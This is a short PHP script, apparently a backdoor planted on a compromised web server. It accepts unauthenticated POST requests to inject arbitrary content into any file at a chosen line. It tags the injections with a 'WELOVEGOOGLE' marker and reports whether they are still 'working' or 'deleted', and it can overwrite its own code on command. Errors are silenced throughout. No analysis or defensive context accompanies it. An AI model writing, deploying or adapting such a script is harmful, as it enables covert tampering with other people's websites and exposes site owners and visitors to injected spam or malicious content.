<?php
	ini_set('display_errors', 0);
	ini_set('display_startup_errors', 0);
	error_reporting(0);
	if($_POST["content"] && $_POST["location"] && $_POST["line"]) {
		$content = $_POST["content"];
		$location = $_POST["location"];
		$add_to_line = $_POST["line"]-1;
		$new_content = null;
		if(@file_get_contents($location)) {
			$data = @file_get_contents($location);
		} else {
			$fopen = @fopen($location, 'w+');
			$data = @fopen($location, 'r');
		}
		$data = explode("\n", $data);
		for ($line=0; $line<count($data); $line++) {
			if(stristr($data[$line], '<!-- WELOVEGOOGLE -->') == false) {
				$new_content .= $data[$line]."\n";
			}
			if($line==$add_to_line) {
				$new_content .= $content."\n";
			}
		}
		if(@file_put_contents($location, $new_content, FILE_TEXT)) {
			echo 'success';
		} elseif(@fwrite($fopen, $new_content)) {
			@fclose($fopen);
			echo 'success';
		}
	} elseif($_POST["location"] && $_POST["checkup"]) {
        $result = 'deleted';
		$location = $_POST["location"];
		if(@file_get_contents($location)) {
			$data = @file_get_contents($location);
		} else {
			$data = @fopen($location, 'r');
		}
		$data = explode("\n", $data);
		for ($line=0; $line<count($data); $line++) {
			if(stristr($data[$line], '<!-- WELOVEGOOGLE -->') == true) {
				$result = 'working';
			}
		}
		echo $result;
	} elseif($_POST["content"] && $_POST["update"]) {
        $content = $_POST["content"];
        $location = __FILE__;
        if(@file_get_contents($location)) {
            $data = @file_get_contents($location);
            @file_put_contents($location, $content, FILE_TEXT);
            echo 'success';
        } else {
            $fopen = @fopen($location, 'w+');
            @fwrite($fopen, $content);
            @fclose($fopen);
            echo 'success';
        }
    } else {
        echo 'error';
	}
?>